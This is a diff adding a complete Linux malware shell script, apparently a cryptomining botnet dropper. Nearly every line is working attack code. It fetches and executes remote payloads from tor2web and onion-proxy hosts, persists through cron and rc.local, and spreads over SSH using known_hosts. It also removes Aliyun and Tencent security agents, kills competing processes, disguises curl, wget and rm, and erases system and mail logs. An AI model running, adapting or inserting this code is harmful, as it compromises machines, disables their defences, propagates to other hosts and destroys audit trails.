+    (${sudo} ${curl} ${COPTS} ${RHOST}${TOR1}${RPATH1} -o ${LBIN5}||${sudo} ${curl} ${COPTS} ${RHOST}${TOR2}${RPATH1} -o ${LBIN5}||${sudo} ${curl} ${COPTS} ${RHOST}${TOR3}${RPATH1} -o ${LBIN5}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH1} -O ${LBIN5}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH1} -O ${LBIN5}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH1} -O ${LBIN5}) && ${sudo} chmod 755 ${LBIN5}
+    ${sudo} mkdir -p /etc/cron.monthly
+    (${sudo} ${curl} ${COPTS} ${RHOST}${TOR1}${RPATH1} -o ${LBIN6}||${sudo} ${curl} ${COPTS} ${RHOST}${TOR2}${RPATH1} -o ${LBIN6}||${sudo} ${curl} ${COPTS} ${RHOST}${TOR3}${RPATH1} -o ${LBIN6}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH1} -O ${LBIN6}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH1} -O ${LBIN6}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH1} -O ${LBIN6}) && ${sudo} chmod 755 ${LBIN6}
+    if [ -f ${sshdir}/known_hosts ] && [ -f ${sshdir}/id_rsa.pub ]; then
+          for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" ${sshdir}/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '${C3}|sh' & done
+    fi
+    ${sudo} touch -acmr /bin/sh /etc/cron.hourly/cronlog
+    ${sudo} touch -acmr /bin/sh /etc/cron.daily/cronlog
+    ${sudo} touch -acmr /bin/sh /etc/cron.monthly/cronlog
+    [[ ! $(${sudo} cat /etc/rc.local | grep "^sh ${LBIN7}") == "sh ${LBIN7}" ]] && { ${sudo} chattr -i -a /etc/rc.local >/dev/null 2>&1; ${sudo} chmod 755 /etc/rc.local >/dev/null 2>&1; ${sudo} sed -i '/^exit 0$/d' /etc/rc.local >/dev/null 2>&1; ${sudo} echo -e "sh ${LBIN7}" >> /etc/rc.local; ${sudo} echo -e "exit 0" >> /etc/rc.local; }
+}
+
+function a() {
+    touch "${LPATH}.a"
+    ${sudo} pkill barad_agent*; ${sudo} pkill anat*;
+    if ${sudo} ps aux|grep -v defunct|grep -i '[a]liyun'; then
+        ${wget} http://update.aegis.aliyun.com/download/uninstall.sh
+        chmod +x uninstall.sh
+        ${sudo} ./uninstall.sh
+        ${wget} http://update.aegis.aliyun.com/download/quartz_uninstall.sh
+        chmod +x quartz_uninstall.sh
+        ${sudo} ./quartz_uninstall.sh
+        ${rm} -f uninstall.sh     quartz_uninstall.sh 2>/dev/null
+        ${sudo} pkill aliyun-service 2>/dev/null
+        ${sudo} ${rm} -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service 2>/dev/null
+        ${sudo} ${rm} -rf /usr/local/aegis* 2>/dev/null;
+    elif ${sudo} ps aux|grep -v defunct|grep -i '[y]unjing'; then
+        ${sudo} /usr/local/qcloud/stargate/admin/uninstall.sh
+        ${sudo} /usr/local/qcloud/YunJing/uninst.sh
+        ${sudo} /usr/local/qcloud/monitor/barad/admin/uninstall.sh
+    fi
+}
+function f() {
+    NTOK=$(netstat --version 2>/dev/null|wc -l)
+    if [ ${NTOK} -eq 0 ]; then NETTOOL='ss '; else NETTOOL='netstat '; fi
+    port=$(${sudo} ${NETTOOL} -an 2>/dev/null| grep :443 | wc -l)
+    self=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep "${grepmn}"|wc -l)
+    if [ ${self} -gt 1 ]; then
+        ${sudo} ps ax|grep -v grep|grep -v defunct|grep "${grepmn}"|awk 'NR >= 2'| while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done
+    fi
+    port=$(${sudo} ${NETTOOL} -an 2>&1| grep :443 | wc -l)
+    self=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep "${grepmn}"|wc -l)
+    if [[ ${self} -eq 0 ]] || [[ ${port} -eq 0 ]];then
+        if [ ! -f ${LPATH}${LBIN3} ] && [ -f ${LPATH}${LBIN2} ]; then
+            unzip -qjoP no-password ${LPATH}${LBIN2} >/dev/null 2>&1; sleep 3
+            mv ${RBIN} ${LPATH}${LBIN3}
+            chmod +x ${LPATH}${LBIN3}
+            ${sudo} chattr +i ${LPATH}${LBIN3} >/dev/null 2>&1
+
+        fi
+        if [[ -f ${LPATH}${LBIN3} ]]; then
+            ${sudo} chattr -i /usr/bin/[${grepmn}] >/dev/null 2>&1
+            if [[ ${sudoer} == 1 ]]; then
+                echo always | ${sudo} tee /sys/kernel/mm/transparent_hugepage/enabled >/dev/null 2>&1
+                ${sudo} sysctl -w vm.nr_hugepages=128 >/dev/null 2>&1
+                ${sudo} ${rm} -f /usr/bin/[${grepmn}] >/dev/null 2>&1; ${sudo} cp ${LPATH}${LBIN3} /usr/bin/[${grepmn}] >/dev/null 2>&1; ${sudo} chmod +x /usr/bin/[${grepmn}] >/dev/null 2>&1
+                ${sudo} nohup "[${grepmn}]" >/dev/null 2>&1 &
+            else
+                ${sudo} ${rm} -f ${LPATH}.${LBIN8} >/dev/null 2>&1; ${sudo} cp ${LPATH}${LBIN3} ${LPATH}.${LBIN8} >/dev/null 2>&1; ${sudo} chmod +x ${LPATH}.${LBIN8} >/dev/null 2>&1
+                ${sudo} nohup ${LPATH}.${LBIN8} >/dev/null 2>&1 &
+            fi
+        fi
+    fi
+    if [ ${SCN} -gt 0 ]; then
+        port2=$(${sudo} ${NETTOOL} -an 2>/dev/null| grep :6379 | wc -l)
+        pysc=$(${sudo} ps aux 2>/dev/null|grep -v grep|grep -v defunct|grep -F " -c import base64;exec(base64.b64decode("|wc -l)
+        if [[ ! -f "${LPATH}.aYn0N29e2MItcV7Di2udY4Idnd0zOC6qsDf" ]] || [[ ${port} -eq 0 ]] || [[ ${port2} -eq 0 ]] || [[ ${pysc} -gt 1 ]]; then
+            ${rm} -rf "${LPATH}.aYn0N29e2MItcV7Di2udY4Idnd0zOC6qsDf"
+            ${sudo} netstat -tanp 2>/dev/null|grep -v ctive|grep -v -|awk '/:8161 */ {split($NF,i1,"/"); print i1[1]}'|uniq|while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done
+            ${sudo} netstat -tanp 2>/dev/null|grep -v redis|grep -v -|awk '/:6379 */ {split($NF,i2,"/"); print i2[1]}'|uniq|while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done
+            #${sudo} killall -9 python >/dev/null 2>&1; ${sudo} killall -9 python2 >/dev/null 2>&1
+            [ ${pysc} -gt 1 ] && { ${sudo} ps aux 2>/dev/null|grep -v grep|grep -v defunct|grep -F " -c import base64;exec(base64.b64decode("|uniq|awk '{print $2}'|while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done; }
+            e 2>/dev/null
+        fi
+    fi
+}
+function g() {
+    if [ $(${sudo} ps aux|grep -v 'grep'|grep -v defunct|grep ' sleep 30'|wc -l) -gt 2 ]; then
+        ${sudo} ps -eo ppid,cmd|grep -v grep|grep -v defunct|grep -v 'sh '|grep -i 'sleep 30'|awk 'NR >= 3'|awk '{print $1}'|while read pid _; do [ ${pid} -gt 301 ] && [ ${pid} -ne "$$" ] && (${sudo} kill -9 "$pid" >/dev/null 2>&1;); done
+        ${sudo} ps aux|grep -v grep|grep -v defunct|grep -v 'sh '|grep ' sleep 30'|awk 'NR >= 3'|awk '{print $2}'| while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done
+    fi
+}
+sudoer=1
+sudo=''
+grepmn="${LBIN8}"
+usrname=$(whoami)
+if [ "$(whoami)" != "root" ]; then
+    sudo="sudo "
+    #timeout 1 sudo -v >/dev/null 2>&1 && sudoer=1||{ sudo=''; sudoer=0; grepmn=".${LBIN8}"; }
+    timeout 1 sudo echo 'kthreadd' 2>/dev/null && sudoer=1||{ sudo=''; sudoer=0; grepmn=".${LBIN8}"; }
+fi
+if [ $(rm --help 2>/dev/null|grep " rm does not remove dir"|wc -l) -ne 0 ]; then rm="rm"; elif [ $(rrn --help 2>/dev/null|grep " rm does not remove dir"|wc -l) -ne 0 ]; then rm="rrn"; else rm="echo"; for f in /bin/*; do strings $f 2>/dev/null|grep -qi " rm does not remove dir" && rm="$f" && ${sudo} mv -f $rm /bin/rrn && break; done; fi
+if [ $(curl --help 2>/dev/null|grep -i "Dump libcurl equivalent"|wc -l) -ne 0 ]; then curl="curl"; elif [ $(lxc --help 2>/dev/null|grep -i "Dump libcurl equivalent"|wc -l) -ne 0 ]; then curl="lxc"; else curl="echo"; for f in ${bpath}/*; do strings $f 2>/dev/null|grep -qi "Dump libcurl equivalent" && curl="$f" && ${sudo} mv -f $curl ${bpath}/lxc && break; done; fi
+if [ $(wget --version 2>/dev/null|grep -i "wgetrc "|wc -l) -ne 0 ]; then wget="wget"; elif [ $(lxw --version 2>/dev/null|grep -i "wgetrc "|wc -l) -ne 0 ]; then wget="lxw"; else wget="echo"; for f in ${bpath}/*; do strings $f 2>/dev/null|grep -qi ".wgetrc'-style command" && wget="$f" && ${sudo} mv -f $wget ${bpath}/lxw && break; done; fi
+rand=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c $(shuf -i 4-16 -n 1) ; echo ''); if [ -z ${rand} ]; then rand='.tmp'; fi
+echo "${rand}" > "$(pwd)/.${rand}" 2>/dev/null && LPATH="$(pwd)/.cache/"; ${rm} -f "$(pwd)/.${rand}" >/dev/null 2>&1
+echo "${rand}" > "/tmp/.${rand}" 2>/dev/null && LPATH="/tmp/.cache/"; ${rm} -f "/tmp/.${rand}" >/dev/null 2>&1
+echo "${rand}" > "/usr/local/bin/.${rand}" 2>/dev/null && LPATH="/usr/local/bin/.cache/"; ${rm} -f "/usr/local/bin/.${rand}" >/dev/null 2>&1
+echo "${rand}" > "${HOME}/.${rand}" 2>/dev/null && LPATH="${HOME}/.cache/"; ${rm} -f "${HOME}/.${rand}" >/dev/null 2>&1
+mkdir -p ${LPATH} >/dev/null 2>&1
+${sudo} chattr -i ${LPATH} >/dev/null 2>&1; chmod 1755 ${LPATH} >/dev/null 2>&1
+if [ "$(whoami)" != "root" ]; then sshdir="${HOME}/.ssh"; else sshdir='/root/.ssh'; fi
+C1='*/4 * * * * R=$(shuf -i 1-29 -n 1);sleep ${R:-0};BP=$(dirname "$(command -v yes)");BP=${BP:-"/usr/bin"};G1="curl";if [ $(curl --version 2>/dev/null|grep "curl "|wc -l) -eq 0 ];then G1="echo";for f in ${BP}/*;do strings $f 2>/dev/null|grep -q "CURLOPT_VERBOSE" && G1="$f" && break;done;fi;G2="wget";if [ $(wget --version 2>/dev/null|grep "wgetrc "|wc -l) -eq 0 ];then G2="echo";for f in ${BP}/*;do strings $f 2>/dev/null|grep -q "to <bug-wget@gnu.org>" && G2="$f" && break;done;fi;if [ $(cat /etc/hosts|grep -i "onion.\|timesync.su\|tor2web"|wc -l) -ne 0 ];then echo "127.0.0.1 localhost" > /etc/hosts >/dev/null 2>&1;fi; C=" -fsSLk --connect-timeout 26 --max-time 75 ";W=" --quiet --tries=1 --no-check-certificate --connect-timeout=26 --timeout=75 ";H="https://an7kmd2wp4xo7hpr";T1=".tor2web.su/";T2=".d2web.org/";T3=".onion.sh/";P="src/ldm";($G1 $C $H$T1$P||$G1 $C $H$T2$P||$G1 $C $H$T3$P||$G2 $W $H$T1$P||$G2 $W $H$T2$P||$G2 $W $H$T3$P)|sh &'
+C2='*/7 * * * * root R=$(shuf -i 1-29 -n 1);sleep ${R:-0};BP=$(dirname "$(command -v yes)");BP=${BP:-"/usr/bin"};G1="curl";if [ $(curl --version 2>/dev/null|grep "curl "|wc -l) -eq 0 ];then G1="echo";for f in ${BP}/*;do strings $f 2>/dev/null|grep -q "CURLOPT_VERBOSE" && G1="$f" && break;done;fi;G2="wget";if [ $(wget --version 2>/dev/null|grep "wgetrc "|wc -l) -eq 0 ];then G2="echo";for f in ${BP}/*;do strings $f 2>/dev/null|grep -q "to <bug-wget@gnu.org>" && G2="$f" && break;done;fi;if [ $(cat /etc/hosts|grep -i "onion.\|timesync.su\|tor2web"|wc -l) -ne 0 ];then echo "127.0.0.1 localhost" > /etc/hosts >/dev/null 2>&1;fi; C=" -fsSLk --connect-timeout 26 --max-time 75 ";W=" --quiet --tries=1 --no-check-certificate --connect-timeout=26 --timeout=75 ";H="https://an7kmd2wp4xo7hpr";T1=".tor2web.su/";T2=".d2web.org/";T3=".onion.sh/";P="src/ldm";($G1 $C $H$T1$P||$G1 $C $H$T2$P||$G1 $C $H$T3$P||$G2 $W $H$T1$P||$G2 $W $H$T2$P||$G2 $W $H$T3$P)|sh &'
+C3='R=$(shuf -i 1-29 -n 1);sleep ${R:-0};BP=$(dirname "$(command -v yes)");BP=${BP:-"/usr/bin"};G1="curl";if [ $(curl --version 2>/dev/null|grep "curl "|wc -l) -eq 0 ];then G1="echo";for f in ${BP}/*;do strings $f 2>/dev/null|grep -q "CURLOPT_VERBOSE" && G1="$f" && break;done;fi;G2="wget";if [ $(wget --version 2>/dev/null|grep "wgetrc "|wc -l) -eq 0 ];then G2="echo";for f in ${BP}/*;do strings $f 2>/dev/null|grep -q "to <bug-wget@gnu.org>" && G2="$f" && break;done;fi;if [ $(cat /etc/hosts|grep -i "onion.\|timesync.su\|tor2web"|wc -l) -ne 0 ];then echo "127.0.0.1 localhost" > /etc/hosts >/dev/null 2>&1;fi; C=" -fsSLk --connect-timeout 26 --max-time 75 ";W=" --quiet --tries=1 --no-check-certificate --connect-timeout=26 --timeout=75 ";H="https://an7kmd2wp4xo7hpr";T1=".tor2web.su/";T2=".d2web.org/";T3=".onion.sh/";P="src/ldm";($G1 $C $H$T1$P||$G1 $C $H$T2$P||$G1 $C $H$T3$P||$G2 $W $H$T1$P||$G2 $W $H$T2$P||$G2 $W $H$T3$P)|sh &'
+if [ -f /usr/bin/yum ]; then
+    INSTALLER="yum reinstall -y -q -e 0 "
+elif [ -f /usr/bin/apt-get ]; then
+    INSTALLER="DEBIAN_FRONTEND=noninteractive ${sudo} apt-get --yes --force-yes install --reinstall "
+elif [ -f /usr/bin/pacman ]; then
+    INSTALLER="pacman -S --noconfirm "
+elif [ -f /sbin/apk ]; then
+    INSTALLER="apk --no-cache -f add "
+fi
+NTOK=$(netstat --version 2>/dev/null|wc -l)
+if [ ${NTOK} -eq 0 ]; then NETTOOL='ss '; ${sudo} ${INSTALLER} net-tools >/dev/null 2>&1; else NETTOOL='netstat '; fi
+
+if [ ! -f "${LPATH}.a" ]; then
+    a >/dev/null 2>&1 &
+fi
+UD=$(${curl} ${COPTS} ${RHOST}${TOR1}src/ud||${curl} ${COPTS} ${RHOST}${TOR2}src/ud||${curl} ${COPTS} ${RHOST}${TOR3}src/ud||${wget} ${WOPTS} ${RHOST}${TOR1}src/ud||${wget} ${WOPTS} ${RHOST}${TOR2}src/ud||${wget} ${WOPTS} ${RHOST}${TOR3}src/ud)
+${rm} -f ./ud ./ud.* >/dev/null 2>&1
+wdog0=$(ps aux|grep -v 'grep'|grep -v defunct|grep -v 'sh '|grep ' sleep 30'|wc -l)
+if [ ${UD:-0} -gt 0 ] && [ ${wdog0} -gt 0 ] && [ ! -f "${LPATH}.mud" ]; then
+    if [ ${UD:-0} -gt 2 ]; then ${sudo} ps ax|grep -v grep|grep -vi defunct|grep "${grepmn}"|while read pid _; do [ ${pid} -gt 301 ] && (${sudo} kill -9 "$pid" >/dev/null 2>&1;); done; fi
+    ${sudo} ps -eo ppid,cmd|grep -v grep|grep -v defunct|grep -v 'sh '|grep -i 'sleep 30'|awk '{print $1}'|while read pid _; do [ ${pid} -gt 301 ] && (${sudo} kill -9 "$pid" >/dev/null 2>&1;); done
+    ${sudo} ps aux|grep -v 'grep'|grep -v defunct|grep -v 'sh '|grep ' sleep 30'|awk '{print $2}'|while read pid _; do [ ${pid} -gt 301 ] && (${sudo} kill -9 "$pid" >/dev/null 2>&1;); done
+    ${sudo} ps -eo ppid,cmd|grep -v grep|grep -v defunct|grep -v 'sh '|grep -i 'timeout 500 tail'|awk '{print $1}'|while read pid _; do [ ${pid} -gt 301 ] && (${sudo} kill -9 "$pid" >/dev/null 2>&1;); done
+    ${sudo} ps aux|grep -v 'grep'|grep -v defunct|grep -v 'sh '|grep 'tail -f /dev/null'|awk '{print $2}'|while read pid _; do [ ${pid} -gt 301 ] && (${sudo} kill -9 "$pid" >/dev/null 2>&1;); done
+    (${curl} ${COPTS} ${RHOST}${TOR1}src/main||${curl} ${COPTS} ${RHOST}${TOR2}src/main||${curl} ${COPTS} ${RHOST}${TOR3}src/main||${wget} ${WOPTS} ${RHOST}${TOR1}src/main||${wget} ${WOPTS} ${RHOST}${TOR2}src/main||${wget} ${WOPTS} ${RHOST}${TOR3}src/main)|base64 -d |${sudo} $(command -v bash) &
+    ${sudo} touch "${LPATH}.mud"
+    exit 0
+fi
+self=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep "${grepmn}"|wc -l)
+if [ ${self} -gt 1 ]; then
+    ${sudo} ps ax|grep -v grep|grep -v defunct|grep "${grepmn}"|awk 'NR >= 2'| while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done
+fi
+selfp=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep "${grepmn}"|head -n 1|awk '{if($3<=34.0) print $2}')
+t=$(shuf -i 1-99 -n 1)
+if [ ${selfp:-0} -gt 301 ] && [ $t -lt 21 ]; then
+    ${sudo} ps ax|grep -v grep|grep -v defunct|grep "${grepmn}"| while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done
+fi
+b >/dev/null 2>&1 &
+if [[ ${sudoer} == 1 ]]; then
+    c >/dev/null 2>&1 &
+fi
+port=$(${sudo} ${NETTOOL} -an 2>/dev/null| grep :443 | wc -l)
+self=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep "${grepmn}"|wc -l)
+selfp=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep "${grepmn}"|head -n 1|awk '{print $3}')
+wdog=1
+if [[ ${self} -eq 0 ]] || [[ ${port} -eq 0 ]]; then
+    wdog=0
+    if [[ -f ${LPATH}${LBIN3} ]]; then
+        ${sudo} chattr -i /usr/bin/[${grepmn}] >/dev/null 2>&1
+        if [[ ${sudoer} == 1 ]]; then
+            ${sudo} ${rm} -f /usr/bin/[${grepmn}] >/dev/null 2>&1; ${sudo} cp ${LPATH}${LBIN3} /usr/bin/[${grepmn}] >/dev/null 2>&1; ${sudo} chmod +x /usr/bin/[${grepmn}] >/dev/null 2>&1
+            ${sudo} nohup "[${grepmn}]" >/dev/null 2>&1 &
+        else
+            ${sudo} ${rm} -f ${LPATH}.${LBIN8} >/dev/null 2>&1; ${sudo} cp ${LPATH}${LBIN3} ${LPATH}.${LBIN8} >/dev/null 2>&1; ${sudo} chmod +x ${LPATH}.${LBIN8} >/dev/null 2>&1
+            ${sudo} nohup ${LPATH}.${LBIN8} >/dev/null 2>&1 &
+        fi
+    fi
+    d
+fi
+if [ ${SCN} -gt 0 ]; then
+    port=$(${sudo} ${NETTOOL} -an 2>/dev/null| grep :443 | wc -l)
+    port2=$(${sudo} ${NETTOOL} -an 2>/dev/null| grep :6379 | wc -l)
+    pysc=$(${sudo} ps aux 2>/dev/null|grep -v grep|grep -v defunct|grep -F " -c import base64;exec(base64.b64decode("|wc -l)
+    if [[ ${UD} -gt 1 ]] || [[ ! -f "${LPATH}.aYn0N29e2MItcV7Di2udY4Idnd0zOC6qsDf" ]] || [[ ${port} -eq 0 ]] || [[ ${port2} -eq 0 ]] || [[ ${pysc} -gt 1 ]]; then
+        ${rm} -rf "${LPATH}.aYn0N29e2MItcV7Di2udY4Idnd0zOC6qsDf"
+        ${sudo} netstat -tanp 2>/dev/null|grep -v redis|grep -v -|awk '/:6379 */ {split($NF,i2,"/"); print i2[1]}'|uniq|while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done
+        [ ${pysc} -gt 1 ] && { ${sudo} ps aux 2>/dev/null|grep -v grep|grep -v defunct|grep -F " -c import base64;exec(base64.b64decode("|uniq|awk '{print $2}'|while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done; }
+        e >/dev/null 2>&1 &
+    fi
+fi
+if [ ${sudoer} == 1 ]; then
+    [ -f /var/spool/mail/$usrname ] && { ${sudo} echo 0>/var/spool/mail/$usrname >/dev/null 2>&1; }
+    [ -f /var/mail/$usrname ] && { ${sudo} echo 0>/var/mail/$usrname >/dev/null 2>&1; }
+    ${sudo} echo 0>/var/log/wtmp >/dev/null 2>&1
+    ${sudo} echo 0>/var/log/secure >/dev/null 2>&1
+    ${sudo} echo 0>/var/log/cron >/dev/null 2>&1
+fi
+g
+(${curl} ${COPTS} ${RHOST}${TOR1}src/wd||${curl} ${COPTS} ${RHOST}${TOR2}src/wd||${curl} ${COPTS} ${RHOST}${TOR3}src/wd||${wget} ${WOPTS} ${RHOST}${TOR1}src/wd||${wget} ${WOPTS} ${RHOST}${TOR2}src/wd||${wget} ${WOPTS} ${RHOST}${TOR3}src/wd)|base64 -d |${sudo} $(command -v bash) &
+if [ $(command -v timeout|wc -l) -ne 0 ] && [ $(command -v tail|wc -l) -ne 0 ]; then
+	bash2="bash"
+	if [ ${sudoer} == 1 ]; then if [ ! -f /usr/lib/logrotate ]; then ${sudo} cp -f $(command -v bash) /usr/lib/logrotate >/dev/null 2>&1 && bash2="/usr/lib/logrotate"; else bash2="/usr/lib/logrotate"; fi; fi
+	(${curl} ${COPTS} ${RHOST}${TOR1}src/wdb||${curl} ${COPTS} ${RHOST}${TOR2}src/wdb||${curl} ${COPTS} ${RHOST}${TOR3}src/wdb||${wget} ${WOPTS} ${RHOST}${TOR1}src/wdb||${wget} ${WOPTS} ${RHOST}${TOR2}src/wdb||${wget} ${WOPTS} ${RHOST}${TOR3}src/wdb)|base64 -d |${sudo} ${bash2} &
+fi
+${sudo} ${rm} -rf wd* >/dev/null 2>&1
+if [ ${UD:-0} -gt 0 ]; then wdog=0; fi
+#if [[ ${wdog} -eq 0 ]] || [[ $(${sudo} ps aux|grep -v 'grep'|grep -v defunct|grep ' sleep 30'|wc -l) -eq 0 ]] || [[ $(${sudo} ps aux|grep -v 'grep'|grep -v defunct|grep ' sleep 30'|wc -l) -gt 2 ]]; then
+if [[ $(${sudo} ps aux|grep -v 'grep'|grep -v 'sh '|grep -v defunct|grep ' sleep 30'|wc -l) -lt 2 ]]; then
+    while true; do
+        b >/dev/null 2>&1 &
+        f >/dev/null 2>&1 &
+        if [ -f /var/spool/mail/$usrname ]; then ${sudo} echo 0>/var/spool/mail/$usrname >/dev/null 2>&1; fi
+        if [ -f /var/mail/$usrname ]; then ${sudo} echo 0>/var/mail/$usrname >/dev/null 2>&1; fi
+        sleep 30
+    done &
+fi
